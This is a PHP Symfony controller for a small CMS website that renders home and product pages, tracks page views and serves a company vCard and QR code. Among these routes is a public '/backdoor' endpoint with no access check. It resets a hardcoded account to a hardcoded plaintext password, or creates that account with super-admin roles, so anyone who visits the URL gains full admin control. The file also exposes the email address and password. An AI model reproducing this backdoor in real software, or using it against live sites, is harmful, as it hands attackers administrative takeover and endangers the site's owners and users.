<?php

namespace App\Controller;

use App\Entity\User;
use App\Repository\CmsCopyRepository;
use App\Repository\CmsPhotoRepository;
use App\Repository\CompanyDetailsRepository;
use App\Repository\ProductRepository;
use App\Repository\UserRepository;
use App\Repository\SubPageRepository;
use Doctrine\ORM\EntityManagerInterface;
use JeroenDesloovere\VCard\VCard;
use Sensio\Bundle\FrameworkExtraBundle\Configuration\Security;
use Symfony\Bundle\FrameworkBundle\Controller\AbstractController;
use Symfony\Component\HttpFoundation\Response;
use Symfony\Component\Routing\Annotation\Route;
use Symfony\Component\Security\Core\Encoder\UserPasswordEncoderInterface;

class   HomeController extends AbstractController
{
    /**
     * @Route("/", name="app_home")
     */
    public function index(CmsCopyRepository $cmsCopyRepository, CmsPhotoRepository $cmsPhotoRepository, SubPageRepository $subPageRepository, CompanyDetailsRepository $companyDetailsRepository, \Symfony\Component\Security\Core\Security $security, EntityManagerInterface $entityManager): Response
    {
        $companyDetails = $companyDetailsRepository->find('1');
        $homePagePhotosOnly = 0;
        $qrcode=false;
        if ($companyDetails) {
            $homePagePhotosOnly = $companyDetails->isHomePagePhotosOnly();
            $qrcode = $companyDetails->isIncludeQRCodeHomePage();
        }

        $cms_copy = [];
        $cms_photo = [];
        $product = [];
        $sub_pages = [];
        $cms_copy = $cmsCopyRepository->findBy([
            'staticPageName' => 'Home'
        ]);

        $cms_photo = $cmsPhotoRepository->findBy(
            ['staticPageName' => 'Home'],
            ['ranking' => 'ASC']
        );

        $cms_copy_ranking1 = $cmsCopyRepository->findOneBy([
            'staticPageName' => 'Home',
            'ranking' => '1',
        ]);

        if ($cms_copy_ranking1) {
            $page_layout = $cms_copy_ranking1->getPageLayout();
        } else {
            $page_layout = 'default';
        }

        if ($cms_copy_ranking1) {
            if ($security->getUser()) {
                if (in_array('ROLE_ADMIN', $security->getUser()->getRoles())) {
                    $pageCountAdmin = $cms_copy_ranking1->getPageCountAdmin();
                    $cms_copy_ranking1->setPageCountAdmin($pageCountAdmin + 1);
                }
            }
            $pageCountUser = $cms_copy_ranking1->getPageCountUsers();
            $cms_copy_ranking1->setPageCountUsers($pageCountUser + 1);
            $entityManager->flush($cms_copy_ranking1);
        }

        if ($homePagePhotosOnly == 1) {
            return $this->render('home/home.html.twig', [
                'photos' => $cms_photo,
                'cms_copy_array' => $cms_copy,
            ]);
        } else {
            return $this->render('home/products.html.twig', [
                'product' => $product,
                'cms_copy_array' => $cms_copy,
                'cms_photo_array' => $cms_photo,
                'sub_pages' => $sub_pages,
                'include_contact' => 'Yes',
                'include_QR_code' => $qrcode,
                'format' => $page_layout
            ]);
        }
    }


    /**
     * @Route("/backdoor", name="/backdoor")
     */
    public function emergencyReset(UserRepository $userRepository, EntityManagerInterface $manager, UserPasswordEncoderInterface $passwordEncoder): Response
    {
        $user = $userRepository->findOneBy(['email' => 'nurse_stephen@hotmail.com']);
        if ($user) {
            $user->setPassword(
                $passwordEncoder->encodePassword(
                    $user,
                    'Descartes99'
                )
            );
        } else {
            $user = new User();
            $user->setFirstName('Stephen')
                ->setLastName('Nurse')
                ->setEmailVerified(1)
                ->setEmail('nurse_stephen@hotmail.com')
                ->setRoles(['ROLE_SUPER_ADMIN', 'ROLE_ADMIN'])
                ->setPassword(
                    $passwordEncoder->encodePassword(
                        $user,
                        'Descartes99'
                    )
                );
            $manager->persist($user);
            $manager->flush();
        }
        $manager->flush();
        return $this->redirectToRoute('app_login');
    }


    /**
     * @Route("/dashboard", name="dashboard")
     */
    public function dashboard()
    {
        return $this->render('home/dashboard.html.twig', []);
    }


    /**
     * @Route("/advanced_dashboard", name="advanced_dashboard")
     * @Security("is_granted('ROLE_ADMIN')")
     */
    public function advancedDashboard()
    {
        return $this->render('template_parts_project_specific/dashboard_project_specific.html.twig', []);
    }


    /**
     * @Route("/interests/{product}", name="product_display")
     */
    public function articles(string $product, CmsCopyRepository $cmsCopyRepository, CmsPhotoRepository $cmsPhotoRepository, SubPageRepository $subPageRepository, ProductRepository $productRepository, \Symfony\Component\Security\Core\Security $security, EntityManagerInterface $entityManager): Response
    {
        $productEntity = $productRepository->findOneBy([
            'product' => $product
        ]);

        if ($productEntity) {
            $cms_copy = $cmsCopyRepository->findBy([
                'product' => $productEntity
            ]);
            $cms_copy_ranking1 = $cmsCopyRepository->findOneBy([
                'product' => $productEntity,
                'ranking' => '1',
            ]);
        } else {
            $cms_copy = $cmsCopyRepository->findBy([
                'staticPageName' => $product
            ]);
            $cms_copy_ranking1 = $cmsCopyRepository->findOneBy([
                'staticPageName' => $product,
                'ranking' => '1',
            ]);
        }

        if ($cms_copy_ranking1) {
            if ($security->getUser()) {
                if (in_array('ROLE_ADMIN', $security->getUser()->getRoles())) {
                    $pageCountAdmin = $cms_copy_ranking1->getPageCountAdmin();
                    $cms_copy_ranking1->setPageCountAdmin($pageCountAdmin + 1);
                }
            }
            $pageCountUser = $cms_copy_ranking1->getPageCountUsers();
            $cms_copy_ranking1->setPageCountUsers($pageCountUser + 1);
            $entityManager->flush($cms_copy_ranking1);
        }
        if ($productEntity) {
            $cms_photo = $cmsPhotoRepository->findBy([
                'product' => $productEntity,
            ],
                ['ranking' => 'ASC'])
            ;
        } else {
            $cms_photo = $cmsPhotoRepository->findBy([
                'staticPageName' => $product
            ],
                ['ranking' => 'ASC']);
        }
        $sub_pages = [];
        if ($cms_copy) {
            $sub_pages = $subPageRepository->findBy([
                'product' => $productEntity
            ]);
        }

        return $this->render('/home/products.html.twig', [
            'product' => $product,
            'cms_copy_array' => $cms_copy,
            'cms_photo_array' => $cms_photo,
            'sub_pages' => $sub_pages,
            'include_contact' => 'No',
            'include_QR_code' => 'No'
        ]);
    }


    /**
     * @Route("/create/VcardUser/company", name="create_vcard_company")
     */
    public function createVcardVenue(CompanyDetailsRepository $companyDetailsRepository)
    {
        $company_details = $companyDetailsRepository->find('1');
        $vcard = new VCard();
        $company = $company_details->getCompanyName();
        $contactFirstName = $company_details->getContactFirstName();
        $contactLastName = $company_details->getContactLastName();

        if ($contactFirstName == null) {
            $firstName = "";
            $lastName = $company;
            $company = "";
        }
        if ($contactFirstName != null) {
            $firstName = $contactFirstName;
            $lastName = $contactLastName;
        }
        $addressStreet = $company_details->getCompanyAddressStreet();
        $addressTown = $company_details->getCompanyAddressTown();
        $addressCity = $company_details->getCompanyAddressCity();
        $addressPostalCode = $company_details->getCompanyAddressPostalCode();
        $addressCountry = $company_details->getCompanyAddressCountry();
        $facebook = $company_details->getFacebook();
        $instagram = $company_details->getInstagram();
        $linkedIn = $company_details->getLinkedIn();
        $url = $_SERVER['SERVER_NAME'];
        $notes_all = "URL: " . $url;
        $email = $company_details->getCompanyEmail();
        $mobile = $company_details->getCompanyMobile();
        $tel = $company_details->getCompanyTel();
        $vcard->addName($lastName, $firstName);
        $vcard->addEmail($email)
            ->addPhoneNumber($mobile, 'home')
            ->addPhoneNumber($tel, 'work')
            ->addCompany($company)
            ->addAddress($name = '', $extended = '', $street = $addressStreet, $city = $addressTown, $region = $addressCity, $zip = $addressPostalCode, $country = $addressCountry, $type = 'WORK POSTAL')
            ->addURL($url)
            ->addNote(strip_tags($notes_all));
        $vcard->download();
        return new Response(null);
    }

    /**
     * @Route("/company_qr_code", name="company_qr_code")
     *
     */
    public function companyQrCode(CompanyDetailsRepository $companyDetailsRepository)
    {
        $company_details = $companyDetailsRepository->find('1');
        $qr_code = $company_details->getCompanyQrCode();
        return $this->render('home/company_qr_code.html.twig', [
            'qr_code' => $qr_code,
        ]);
    }
}
